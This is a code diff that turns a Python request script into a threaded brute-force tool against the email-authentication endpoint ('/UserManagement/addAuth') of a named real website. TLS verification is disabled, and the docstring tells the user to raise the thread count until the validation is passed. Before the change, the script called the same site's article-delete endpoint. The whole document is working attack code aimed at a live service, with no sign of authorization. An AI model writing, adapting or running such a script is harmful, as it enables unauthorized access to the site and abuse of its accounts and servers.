@@ -1,4 +1,8 @@
 '''
+F88K email authentication.
+
+Brute force for validation, you may not pass the validation if your device cannot send enough request.
+Ajust the threads number, the email and userId.
 '''
 
 
@@ -6,10 +10,9 @@ import json
 import threading
 import requests
 
-articleId = '22110626H20GRD40'
-
+email = '66668888@wku.edu.cn'
 requests.packages.urllib3.disable_warnings()
-base_url = "https://www.jumboxtech.com:8022/article/fDeleteArticle"
+base_url = "https://www.jumboxtech.com:8022/UserManagement/addAuth"
 header = {
     'Host': 'www.jumboxtech.com:8022',
     'Connection': 'keep-alive',
@@ -23,7 +26,7 @@ header = {
 
 s = requests.session()
 s.keep_alive = False
-payload = f'articleId={articleId}'
+payload = f'email={email}&type=1'
 req = s.post(base_url, headers=header, data=payload, verify=False)
 ob = json.loads(req.content.decode(encoding='utf-8'))
 print(req.content.decode(encoding='utf-8'))
